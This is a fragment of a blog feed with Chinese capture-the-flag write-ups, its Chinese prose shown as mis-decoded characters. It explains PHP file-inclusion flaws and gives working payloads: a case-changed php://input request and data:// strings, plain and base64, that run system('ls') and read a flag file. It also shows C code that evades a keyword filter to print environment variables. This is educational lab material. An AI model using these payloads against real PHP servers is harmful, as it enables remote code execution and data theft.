GET ÂèÇÊï∞ÁöÑÂÄºËµãÁªôÂèòÈáè $page</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"php://\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// ÂΩì $page ‰∏≠ÂåÖÂê´ \"php://\" Êó∂ÊâßË°åÂæ™ÁéØ</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// Â∞Ü $page ‰∏≠ÁöÑÊâÄÊúâ \"php://\" ÊõøÊç¢‰∏∫Á©∫Â≠óÁ¨¶‰∏≤</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// ÂåÖÂê´Âπ∂ÊâßË°å $page ÂØπÂ∫îÁöÑÊñá‰ª∂</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><blockquote>\n<p>Áî±‰∫éËøôÊÆµ‰ª£Á†ÅÂØπÁî®Êà∑ËæìÂÖ•ÁöÑ  <code>$page</code>  ÂèÇÊï∞Áõ¥Êé•ËøõË°å‰∫Ü  <code>include</code> ÔºåÂ≠òÂú®ÂÆâÂÖ®È£éÈô©„ÄÇÊú™ÁªèÈ™åËØÅÁöÑÁî®Êà∑ËæìÂÖ•ÂèØËÉΩÂØºËá¥ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ÔºàRFIÔºâÊîªÂáªÊàñ‰ª£Á†ÅÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇ</p>\n</blockquote>\n<blockquote>\n<p>‰∏Ä„ÄÅÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÂàÜÁ±ª</p>\n<p>LFI(Local File Inclusion)<br>\n Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÔºåÊåáÁöÑÊòØËÉΩÊâìÂºÄÂπ∂ÂåÖÂê´Êú¨Âú∞Êñá‰ª∂ÁöÑÊºèÊ¥û„ÄÇÂ§ßÈÉ®ÂàÜÊÉÖÂÜµ‰∏ãÈÅáÂà∞ÁöÑÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÈÉΩÊòØ LFI„ÄÇ<br>\n‰∏∫‰∫ÜÊñπ‰æøÊú¨ÊñáÊää LFI Áõ¥Êé•Áß∞‰∏∫Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û„ÄÇ</p>\n<p>RFI(Remote File Inclusion)<br>\n ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥û„ÄÇÊòØÊåáËÉΩÂ§üÂåÖÂê´ËøúÁ®ãÊúçÂä°Âô®‰∏äÁöÑÊñá‰ª∂Âπ∂ÊâßË°å„ÄÇÁî±‰∫éËøúÁ®ãÊúçÂä°Âô®ÁöÑÊñá‰ª∂ÊòØÊàë‰ª¨ÂèØÊéßÁöÑÔºåÂõ†Ê≠§ÊºèÊ¥û‰∏ÄÊó¶Â≠òÂú®Âç±ÂÆ≥ÊÄß‰ºöÂæàÂ§ß„ÄÇ‰ΩÜ RFI ÁöÑÂà©Áî®Êù°‰ª∂ËæÉ‰∏∫ËãõÂàªÔºåÈúÄË¶Å php.ini ‰∏≠ËøõË°åÈÖçÁΩÆ</p>\n<pre><code>allow_url_fopen = On\nallow_url_include = On\n</code></pre>\n<p>‰∏§‰∏™ÈÖçÁΩÆÈÄâÈ°πÂùáÈúÄË¶Å‰∏∫ OnÔºåÊâçËÉΩËøúÁ®ãÂåÖÂê´Êñá‰ª∂ÊàêÂäü„ÄÇ<br>\nÂú® php.ini ‰∏≠Ôºåallow_url_fopen ÈªòËÆ§‰∏ÄÁõ¥ÊòØ OnÔºåËÄå allow_url_include ‰ªé php5.2 ‰πãÂêéÂ∞±ÈªòËÆ§‰∏∫ Off„ÄÇ</p>\n</blockquote>\n<blockquote>\n<p>‰∫å„ÄÅÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÂéüÁêÜ</p>\n<p>Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÔºàLocal File InclusionÔºâÊºèÊ¥ûÔºåÊòØÁ®ãÂ∫èÂëòÂú®ÁΩëÁ´ôËÆæËÆ°‰∏≠Ôºå‰∏∫Êñπ‰æøËá™Â∑±Âú®ËÆæËÆ°ÊûÑÊû∂Êó∂Ôºå‰ΩøÁî®‰∫Ü‰∏Ä‰∫õÂåÖÂê´ÁöÑÂáΩÊï∞ÔºåÂú®Êñá‰ª∂‰∏≠ÂåÖÂê´‰∏Ä‰∏™Êñá‰ª∂„ÄÇ</p>\n<p>ÊúçÂä°Âô®ÊâßË°å PHP Êñá‰ª∂Êó∂ÔºåÂèØ‰ª•ÈÄöËøáÊñá‰ª∂ÂåÖÂê´ÂáΩÊï∞Âä†ËΩΩÂè¶‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÁöÑ PHP ‰ª£Á†ÅÔºåÂπ∂‰∏îÂΩì PHP Êù•ÊâßË°åÔºåËøô‰ºö‰∏∫ÂºÄÂèëËÄÖËäÇÁúÅÂ§ßÈáèÁöÑÊó∂Èó¥„ÄÇ</p>\n<p>ËøôÊÑèÂë≥ÁùÄÂèØ‰ª•ÂàõÂª∫‰æõÊâÄÊúâÁΩëÈ°µÂºïÁî®ÁöÑÊ†áÂáÜÈ°µÁúâÊàñËèúÂçïÊñá‰ª∂„ÄÇÂΩìÈ°µÁúâÈúÄË¶ÅÊõ¥Êñ∞Êó∂ÔºåÂè™Êõ¥Êñ∞‰∏Ä‰∏™ÂåÖÂê´Êñá‰ª∂Â∞±ÂèØ‰ª•‰∫ÜÔºåÊàñËÄÖÂΩìÂêëÁΩëÁ´ôÊ∑ªÂä†‰∏ÄÂº†Êñ∞È°µÈù¢Êó∂Ôºå‰ªÖ‰ªÖÈúÄË¶Å‰øÆÊîπ‰∏Ä‰∏ãËèúÂçïÊñá‰ª∂ÔºàËÄå‰∏çÊòØÊõ¥Êñ∞ÊâÄÊúâÁΩëÈ°µ‰∏≠ÁöÑÈìæÊé•Ôºâ„ÄÇ</p>\n<p>LFI ‰∫ßÁîüÁöÑÂéüÂõ†ÊòØÁî±‰∫éÁ®ãÂ∫èÂëòÊú™ÂØπÁî®Êà∑ÂèØÊéßÂèòÈáèËøõË°åËæìÂÖ•Ê£ÄÊü•ÔºåÊ≠§ÊºèÊ¥ûÁöÑÂΩ±ÂìçÂèØËÉΩÂØºËá¥Ê≥ÑÈú≤ÊúçÂä°Âô®‰∏äÁöÑÊïèÊÑüÊñá‰ª∂Á≠â„ÄÇ<br>\nÂ¶ÇËã•ÊîªÂáªËÄÖËÉΩÂ§üÈÄöËøáÂÖ∂‰ªñÊñπÂºèÂú® Web ÊúçÂä°Âô®‰∏äÊîæÁΩÆ‰ª£Á†ÅÔºåÈÇ£‰πà‰ªñ‰ª¨‰æøÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§</p>\n</blockquote>\n<blockquote>\n<p>‰∏â„ÄÅÊñá‰ª∂ÂåÖÂê´ÂáΩÊï∞</p>\n<p>PHP ‰∏≠Êñá‰ª∂ÂåÖÂê´ÂáΩÊï∞Êúâ‰ª•‰∏ãÂõõÁßçÔºö</p>\n<p>require () // Âè™Âú®ÊâßË°åÂà∞Ê≠§ÂáΩÊï∞Êó∂ÊâçÂéªÂåÖÂê´Êñá‰ª∂ÔºåËã•ÂåÖÂê´ÁöÑÊñá‰ª∂‰∏çÂ≠òÂú®‰∫ßÁîüË≠¶ÂëäÔºåÁ®ãÂ∫èÁªßÁª≠ËøêË°å</p>\n<p>require_once () // Â¶ÇÊûú‰∏Ä‰∏™Êñá‰ª∂Â∑≤ÁªèË¢´ÂåÖÂê´ËøáÔºåÂàô‰∏ç‰ºöÂú®ÂåÖÂê´ÂÆÉ</p>\n<p>include () // Á®ãÂ∫è‰∏ÄËøêË°åÊñá‰ª∂‰æø‰ºöÂåÖÂê´ËøõÊù•ÔºåËã•ÂåÖÂê´Êñá‰ª∂‰∏çÂ≠òÂú®‰∫ßÁîüËá¥ÂëΩÈîôËØØÔºåÁ®ãÂ∫èÁªàÊ≠¢ËøêË°å</p>\n<p>include_once () // Â¶ÇÊûú‰∏Ä‰∏™Êñá‰ª∂Â∑≤ÁªèË¢´ÂåÖÂê´ËøáÔºåÂàô‰∏ç‰ºöÂú®ÂåÖÂê´ÂÆÉ</p>\n<p>include Âíå require Âå∫Âà´‰∏ªË¶ÅÊòØÔºåinclude Âú®ÂåÖÂê´ÁöÑËøáÁ®ã‰∏≠Â¶ÇÊûúÂá∫Áé∞ÈîôËØØÔºå‰ºöÊäõÂá∫‰∏Ä‰∏™Ë≠¶ÂëäÔºåÁ®ãÂ∫èÁªßÁª≠Ê≠£Â∏∏ËøêË°åÔºõ<br>\nËÄå require ÂáΩÊï∞Âá∫Áé∞ÈîôËØØÁöÑÊó∂ÂÄôÔºå‰ºöÁõ¥Êé•Êä•ÈîôÂπ∂ÈÄÄÂá∫Á®ãÂ∫èÁöÑÊâßË°å„ÄÇ</p>\n<p>ËÄå include_once ()Ôºårequire_once () Ëøô‰∏§‰∏™ÂáΩÊï∞Ôºå‰∏éÂâç‰∏§‰∏™ÁöÑ‰∏çÂêå‰πãÂ§ÑÂú®‰∫éËøô‰∏§‰∏™ÂáΩÊï∞Âè™ÂåÖÂê´‰∏ÄÊ¨°ÔºåÈÄÇÁî®‰∫éÂú®ËÑöÊú¨ÊâßË°åÊúüÈó¥Âêå‰∏Ä‰∏™Êñá‰ª∂ÊúâÂèØËÉΩË¢´ÂåÖÊã¨Ë∂ÖËøá‰∏ÄÊ¨°ÁöÑÊÉÖÂÜµ‰∏ãÔºå‰Ω†ÊÉ≥Á°Æ‰øùÂÆÉÂè™Ë¢´ÂåÖÊã¨‰∏ÄÊ¨°‰ª•ÈÅøÂÖçÂáΩÊï∞ÈáçÂÆö‰πâÔºåÂèòÈáèÈáçÊñ∞ËµãÂÄºÁ≠âÈóÆÈ¢ò„ÄÇ</p>\n<p>ËøôÂõõ‰∏™ÂáΩÊï∞ÂèØ‰ª•Â∞Ü‰ªªÊÑèÁ±ªÂûãÁöÑÊñá‰ª∂ÂΩìÂÅö PHP Êñá‰ª∂ËøõË°åËß£Êûê„ÄÇ<br>\nÁ§∫‰æã‰ª£Á†ÅÔºö</p>\n   <?php\n       $filename  = $_GET['filename']; // Â≠òÂú®ÂèØÊéßÂèòÈáè\n       include($filename); // Â≠òÂú®Âä®ÊÄÅÂèòÈáè\n   ?>\n<p>‰æãÂ¶ÇÔºö</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo stretchy=\"false\">[</mo><mtext>‚Äò</mtext><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mtext>‚Äô</mtext><mo stretchy=\"false\">]</mo><mtext>ÂèÇÊï∞ÂºÄÂèëËÄÖÊ≤°ÊúâÁªèËøá‰∏•Ê†ºÁöÑËøáÊª§ÔºåÁõ¥Êé•Â∏¶ÂÖ•‰∫Ü</mtext><mi>i</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>u</mi><mi>d</mi><mi>e</mi><mtext>ÁöÑÂáΩÊï∞ÔºåÊîªÂáªËÄÖÂèØ‰ª•‰øÆÊîπ</mtext></mrow><annotation encoding=\"application/x-tex\">_GET[‚Äòfilename‚Äô]ÂèÇÊï∞ÂºÄÂèëËÄÖÊ≤°ÊúâÁªèËøá‰∏•Ê†ºÁöÑËøáÊª§ÔºåÁõ¥Êé•Â∏¶ÂÖ•‰∫ÜincludeÁöÑÂáΩÊï∞Ôºå\nÊîªÂáªËÄÖÂèØ‰ª•‰øÆÊîπ\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">‚Äã</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\">[</span><span class=\"mord\">‚Äò</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">‚Äô</span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">ÂèÇ</span><span class=\"mord cjk_fallback\">Êï∞</span><span class=\"mord cjk_fallback\">ÂºÄ</span><span class=\"mord cjk_fallback\">Âèë</span><span class=\"mord cjk_fallback\">ËÄÖ</span><span class=\"mord cjk_fallback\">Ê≤°</span><span class=\"mord cjk_fallback\">Êúâ</span><span class=\"mord cjk_fallback\">Áªè</span><span class=\"mord cjk_fallback\">Ëøá</span><span class=\"mord cjk_fallback\">‰∏•</span><span class=\"mord cjk_fallback\">Ê†º</span><span class=\"mord cjk_fallback\">ÁöÑ</span><span class=\"mord cjk_fallback\">Ëøá</span><span class=\"mord cjk_fallback\">Êª§</span><span class=\"mord cjk_fallback\">Ôºå</span><span class=\"mord cjk_fallback\">Áõ¥</span><span class=\"mord cjk_fallback\">Êé•</span><span class=\"mord cjk_fallback\">Â∏¶</span><span class=\"mord cjk_fallback\">ÂÖ•</span><span class=\"mord cjk_fallback\">‰∫Ü</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">ÁöÑ</span><span class=\"mord cjk_fallback\">ÂáΩ</span><span class=\"mord cjk_fallback\">Êï∞</span><span class=\"mord cjk_fallback\">Ôºå</span><span class=\"mord cjk_fallback\">Êîª</span><span class=\"mord cjk_fallback\">Âáª</span><span class=\"mord cjk_fallback\">ËÄÖ</span><span class=\"mord cjk_fallback\">ÂèØ</span><span class=\"mord cjk_fallback\">‰ª•</span><span class=\"mord cjk_fallback\">‰øÆ</span><span class=\"mord cjk_fallback\">Êîπ</span></span></span></span>_GET [‚Äòfilename‚Äô] ÁöÑÂÄºÔºåÊâßË°åÈùûÈ¢ÑÊúüÁöÑÊìç‰Ωú„ÄÇ</p>\n</blockquote>\n<ul>\n<li>„Äêfile:// ÂçèËÆÆ„Äë</li>\n</ul>\n<blockquote>\n<p>file:// ÂçèËÆÆÂú®Âèå off ÁöÑÊÉÖÂÜµ‰∏ã‰πüÂèØ‰ª•Ê≠£Â∏∏‰ΩøÁî®Ôºõ</p>\n<p>allow_url_fopen Ôºöoff/on</p>\n<p>allow_url_includeÔºöoff/on</p>\n<p>file:// Áî®‰∫éËÆøÈóÆÊú¨Âú∞Êñá‰ª∂Á≥ªÁªüÔºåÂú® CTF ‰∏≠ÈÄöÂ∏∏Áî®Êù•ËØªÂèñÊú¨Âú∞Êñá‰ª∂ÁöÑ‰∏î‰∏çÂèó allow_url_fopen ‰∏é allow_url_include ÁöÑÂΩ±Âìç„ÄÇ</p>\n<p>‰ΩøÁî®ÊñπÊ≥ïÔºö</p>\n<p>file:// [Êñá‰ª∂ÁöÑÁªùÂØπË∑ØÂæÑÂíåÊñá‰ª∂Âêç]</p>\n</blockquote>\n<ul>\n<li>„Äêphp:// ÂçèËÆÆ„Äë</li>\n</ul>\n<blockquote>\n<p>Êù°‰ª∂Ôºö</p>\n<p>‰∏çÈúÄË¶ÅÂºÄÂêØ allow_url_fopenÔºå‰ªÖ php://input„ÄÅ php://stdin„ÄÅ php://memory Âíå php://temp ÈúÄË¶ÅÂºÄÂêØ allow_url_include„ÄÇ</p>\n<p>php://filter ËØªÂèñÊ∫ê‰ª£Á†ÅÂπ∂ËøõË°å base64 ÁºñÁ†ÅËæìÂá∫Ôºå‰∏çÁÑ∂‰ºöÁõ¥Êé•ÂΩìÂÅö php ‰ª£Á†ÅÊâßË°åÂ∞±Áúã‰∏çÂà∞Ê∫ê‰ª£Á†ÅÂÜÖÂÆπ‰∫Ü„ÄÇ</p>\n<p>php://input ÂèØ‰ª•ËÆøÈóÆËØ∑Ê±ÇÁöÑÂéüÂßãÊï∞ÊçÆÁöÑÂè™ËØªÊµÅÔºåÂ∞Ü post ËØ∑Ê±Ç‰∏≠ÁöÑÊï∞ÊçÆ‰Ωú‰∏∫ PHP ‰ª£Á†ÅÊâßË°å„ÄÇ</p>\n</blockquote>\n<ul>\n<li>„Äêdata:// ÂçèËÆÆ„Äë</li>\n</ul>\n<blockquote>\n<p>ÁªèËøáÊµãËØïÂÆòÊñπÊñáÊ°£‰∏äÂ≠òÂú®‰∏ÄÂ§ÑÈóÆÈ¢òÔºåÁªèËøáÊµãËØï PHP ÁâàÊú¨ 5.2Ôºå5.3Ôºå5.5Ôºå7.0Ôºõdata:// ÂçèËÆÆÊòØÊòØÂèóÈôê‰∫é allow_url_fopen ÁöÑÔºåÂÆòÊñπÊñáÊ°£‰∏äÁªôÂá∫ÁöÑÊòØ NOÔºåÊâÄ‰ª•Ë¶Å‰ΩøÁî® data:// ÂçèËÆÆÈúÄË¶ÅÊª°Ë∂≥Âèå on Êù°‰ª∂</p>\n<p>‰æãÂ≠êÔºö</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW4=\">http://127.0.0.1/cmd.php?file=data://text/plain</span>,<?php phpinfo()?></p>\n<p>or</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW47YmFzZTY0LFBEOXdhSEFnY0dod2FXNW1ieWdwUHo0PQ==\">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></p>\n</blockquote>\n<p><img data-src=\"/img/webpic/713e77b23fb645afa92fb923eda7ac77.png\" alt=\"img\"></p>\n<ol>\n<li>ÊñπÊ≥ï‰∏ÄÔºö</li>\n</ol>\n<p>php ÂçèËÆÆÔºö</p>\n<p><img data-src=\"/img/webpic/image-20230824233946558.png\" alt=\"image-20230824233946558\"></p>\n<p>Âè™ËÉΩÁî® burp ‰∏çËÉΩÁî® harkbar ÊúâÁÇπÂ•áÊÄ™</p>\n<p>ËØ∑Ê±ÇÂåÖÔºö</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/?page=PhP://input</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">61.147.171.105:64567</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">21</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>&lt;?php system(\"ls\");?></pre></td></tr></table></figure><p>Êúâ flag</p>\n<p><img data-src=\"/img/webpic/image-20230824234142386.png\" alt=\"image-20230824234142386\"></p>\n<p>ÂæóÂà∞ flag</p>\n<ol start=\"2\">\n<li>ÊñπÊ≥ï‰∫åÔºö</li>\n</ol>\n<p><img data-src=\"/img/webpic/image-20230824235157008.png\" alt=\"image-20230824235157008\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain,&lt;?php system(\"ls\")?></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=   //Êé®Ëçê</span></span></pre></td></tr></table></figure><p>ÈÉΩÂèØ‰ª•</p>\n<p><img data-src=\"/img/webpic/image-20230824235301184.png\" alt=\"image-20230824235301184\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain,&lt;?php system(\"cat fl4gisisish3r3.php\")?></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==   //Êé®Ëçê</span></span></pre></td></tr></table></figure>",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/08/13/Nep-wp/",
            "url": "http://example.com/2023/08/13/Nep-wp/",
            "title": "Nep__wp",
            "date_published": "2023-08-13T13:28:56.000Z",
            "content_html": "<h1 id=\"nepctf-wp\"><a class=\"markdownIt-Anchor\" href=\"#nepctf-wp\">#</a> NepCTF   wp</h1>\n<p>Á¨¨‰∏ÄÊ¨°Â§ßÂûãÊØîËµõÔºåÂæóÂà∞Ëøô‰∏™ÊàêÁª©‰πü‰∏çÈîô‰∫Ü„ÄÇ</p>\n<p><img data-src=\"/img/wp/image-20230813204701517.png\" alt=\"image-20230813204701517\"></p>\n<blockquote>\n<p>{ = Á©∫Ê†º</p>\n</blockquote>\n<h2 id=\"1-misc\"><a class=\"markdownIt-Anchor\" href=\"#1-misc\">#</a> 1. misc:</h2>\n<h4 id=\"1codes\"><a class=\"markdownIt-Anchor\" href=\"#1codes\">#</a> 1.codes:</h4>\n<pre><code>ÁéØÂ¢ÉenvË¶Å\nen\\\nvÁªïËøá‰∏ã\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>en\\</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>viron<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>en\\</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>viron<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> en\\</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>viron<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"/img/wp/1.png\" alt=\"\"></p>\n<h4 id=\"2‰∏éaiÂÖ±ËàûÁöÑÂìàÂ§´Êõº\"><a class=\"markdownIt-Anchor\" href=\"#2‰∏éaiÂÖ±ËàûÁöÑÂìàÂ§´Êõº\">#</a> 2. ‰∏é AI ÂÖ±ËàûÁöÑÂìàÂ§´Êõº</h4>\n<p><u>ËøôÂ∞±ÊòØ hint ÂòõÔºåÂπ¥ËΩª‰∫∫Â∞±Ë¶ÅÂπ¥ËΩªÔºåÊ≠£Áªè‰∫∫Ë∞ÅËá™Â∑±ÂÜô‰ª£Á†Å</u></p>\n<p>AI ‰ª£Á†ÅÊîæËøõÂéªÔºåËá™Â∑±Áªô ÂòªÂòª</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> heapq</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">HuffmanNode</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> char<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        self<span class=\"token punctuation\">.</span>char <span class=\"token operator\">=</span> char</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>freq <span 